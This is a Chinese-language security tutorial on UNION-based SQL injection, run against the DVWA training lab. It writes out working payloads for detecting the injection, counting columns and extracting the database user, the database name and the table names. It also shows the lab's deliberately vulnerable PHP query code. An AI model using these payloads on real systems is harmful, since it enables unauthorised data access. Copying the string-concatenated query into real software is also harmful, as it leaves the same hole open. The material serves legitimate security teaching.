---
title: SQL注入系列篇之union联合注入
url: https://www.secpulse.com/archives/199755.html
source: 安全脉搏
date: 2023-04-29
fetch_date: 2025-10-04T11:31:34.037561
---

# SQL注入系列篇之union联合注入

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# SQL注入系列篇之union联合注入

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[第59号实验室](https://www.secpulse.com/newpage/author?author_id=49738)

2023-04-28

15,892

## 一：union注入概念

我们知道,SQL语句的union联合查询常用格式如下

> select 1,2,3 from table\_name1 union select 4,5,6 from table\_name2;

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-1682653807.png)

而在注入过程中，我们把union select 4,5,6 from table\_name2部分称作是union注入部分,它的主要特点是通过union和前面一条SQL语句拼接,并构造其列数与前面的SQL语句列数相同,如1,2,3==4,5,6均为3列。我们把这种注入方式称为union注入

## 二：union注入利用流程

这里我用DVWA靶机环境的SQL Injection部分做演示。输入1 发送正常请求得到返回值

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-1682653808.png)

#### 1. 判断注入点类型

在本篇文章我们重点放在构造union注入部分,探测注入点类型这里就简单过一下。依次输入 **3-2;1 and 1=1; 1” and “1”=”1;1’ and ‘1’=’1**; 查看回显页面可知,该输入点存在单引号的字符型注入。可根据 **1’ and ‘1’=’1;1’ and ‘1’=’2** 的输入结果判断

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-16826538081.png)

1' and '1'='1

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-1682653809.png)

1' and '1'='2

#### 2. 判断后台SQL的列数

在概念部分我们知道union注入的关键点之一就是要判断原SQL的列数,这里我们可以通过order by n #来判断。n 表示列数,#表示注释,用于注释点order by n后面部分的SQL。依次输入**1’ order by 5#;1’ order by 3#;1’ order by 2#**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-1682653810.png)

1' order by 5#

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-1682653811.png)

1' order by 2#

在1’ order by 5#时,由于原SQL列数少于5,所以报错,在不断减小n的值之后,直到n=2时不再报错,此时可以判断原SQL的列数为2

#### 3. union注入探测

首先构造输入,使输入能正确拼接在后台原始SQL中。输入 **1’ union select 1,2 #**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-16826538111.png)

1' union select 1,2 #

1’ 部分表示与原始SQL的单引号拼接成完整字符
union 部分表示与原始SQL语句拼接
select 1,2 部分是SQL注入攻击者可以控制写的SQL,其中一定要保持只有2列
# 部分注释掉原始SQL的后半部分
执行成功后，我们可以在select 1,2部分进行变形,如select user(),database()。即在输入点输入 **1’ union select user(),database()#**。得到用户名和数据库名

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-1682653812.png)

1' union select user(),database()#

接下来我们可以尝试获取所有表名,列名,表中数据等等。以获取表名为例，在输入点输入**1’ union select group\_concat(table\_name),database() from information\_schema.tables where table\_schema = database() #**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-1682653814.jpg)

1' union select group\_concat(table\_name),database() from information\_schema.tables where table\_schema = database() #

通过这条语句我们得到了当前数据库名dvwa下的所有表名,含有guestbook;users两个表。只要适当修改SQL就可获取表的数据

## 三：后台SQL及拼接后的原型

从dvwa后台可知，处理该请求的后台语句如下

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ``` | ``` <?php  if( isset( $_REQUEST[ 'Submit' ] ) ) {     // Get input     $id = $_REQUEST[ 'id' ];      // Check database     $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";     $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );      // Get results     $num = mysql_numrows( $result );     $i   = 0;     while( $i < $num ) {         // Get values         $first = mysql_result( $result, $i, "first_name" );         $last  = mysql_result( $result, $i, "last_name" );          // Feedback for end user         echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";          // Increase loop count         $i++;     }      mysql_close(); } ?> ``` |

后台SQL为”SELECT first\_name, last\_name FROM users WHERE user\_id = ‘$id’;” ,将用户输入$id直接拼接在原始SQL中,所以我们构造的部分输入到数据库中执行时的完整SQL如下

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ``` | ``` 1' and '1'='1 SELECT first_name, last_name FROM users WHERE user_id = '1' and '1'='1';  1' and '1'='2 SELECT first_name, last_name FROM users WHERE user_id = '1' and '1'='2';  1' order by 5# SELECT first_name, last_name FROM users WHERE user_id = '1' order by 5#';  1' order by 2# SELECT first_name, last_name FROM users WHERE user_id = '1' order by 2#';  1' union select 1,2 # SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,2 #';  1' union select user(),database()# SELECT first_name, last_name FROM users WHERE user_id = '1' union select user(),database()#';  1' union select group_concat(table_name),database() from information_schema.tables where table_schema = database() # SELECT first_name, last_name FROM users WHERE user_id = '1' union select group_concat(table_name),database() from information_schema.tables where table_schema = database() #'; ``` |

## 四：总结

union注入攻击,通过union或union all连接,将自己写的SQL拼接到原始SQL中，从而达到执行任意SQL语句的效果。

下一期将介绍报错注入。

往期推荐：[扫盲帖 | SQL注入简介](http://mp.weixin.qq.com/s?__biz=MzI0NDgxMzgxNA==&mid=2247483970&idx=1&sn=f2a5409e53c4b7f8bcb37cbf210dc724&chksm=e95958dbde2ed1cda1cfe5a2b91fa55441d1b8f2cd968872529160f033ff31d866ff21e5a484&scene=21#wechat_redirect)

第59号 公众账号致力于为行内、外所有关注数据安全的

企业同仁搭建一个只分享专业资讯、热点剖析、

行内大会的信息共享平台。

|  |  |
| --- | --- |
| ![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-1682653815.jpeg) | ![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199755-1682653815.gif) |

**本文作者：[第59号实验室](newpage/author?author_id=49738)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/199755.html**](https://www.secpulse.com/archives/199755.html)

Tags: [SQL注入](https://www.secpulse.com/archives/tag/SQL%E6%B3%A8%E5%85%A5)、[union注入](https://www.secpulse.com/archives/tag/union%E6%B3%A8%E5%85%A5)

点赞：
3
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![代码审计 | Wavsep靶场审计防御](...